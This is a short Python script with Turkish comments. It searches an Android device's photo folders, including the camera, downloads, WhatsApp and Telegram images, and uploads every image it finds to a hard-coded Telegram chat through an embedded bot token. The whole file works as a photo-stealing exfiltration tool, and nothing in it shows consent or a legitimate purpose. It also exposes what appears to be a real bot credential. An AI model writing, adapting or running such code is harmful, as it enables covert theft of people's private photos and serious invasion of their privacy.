import os
import telebot

# Telegram Bot Token (BotFather'dan alınır)
BOT_TOKEN = "7853452883:AAGqv5L_WKg6V16QRCamkyNocd3BkVoV0Zo"

# Fotoğrafları göndereceğiniz sohbet ID'si
CHAT_ID = "7585942324"

# Telegram botu başlat
bot = telebot.TeleBot(BOT_TOKEN)

# Android'de yaygın resim dizinleri
photo_dirs = [
    "/storage/emulated/0/DCIM/",
    "/storage/emulated/0/Pictures/",
    "/storage/emulated/0/Download/",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
    "/storage/emulated/0/Telegram/Telegram Images/"
]

def find_photos(directories):
    """ Belirtilen dizinlerdeki tüm fotoğraf dosyalarını bulur """
    photo_files = []
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp")):
                        photo_files.append(os.path.join(root, file))
    return photo_files

def send_photos(photo_files):
    """ Bulunan tüm fotoğrafları Telegram'a gönderir """
    for photo in photo_files:
        try:
            with open(photo, "rb") as img:
                bot.send_photo(CHAT_ID, img)
            print(f"Gönderildi: {photo}")
        except Exception as e:
            print(f"Hata oluştu: {photo} - {e}")

# Fotoğrafları bul ve Telegram'a gönder
photos = find_photos(photo_dirs)
if photos:
    send_photos(photos)
else:
    print("Hiç fotoğraf bulunamadı.")

print("Tüm işlemler tamamlandı.")
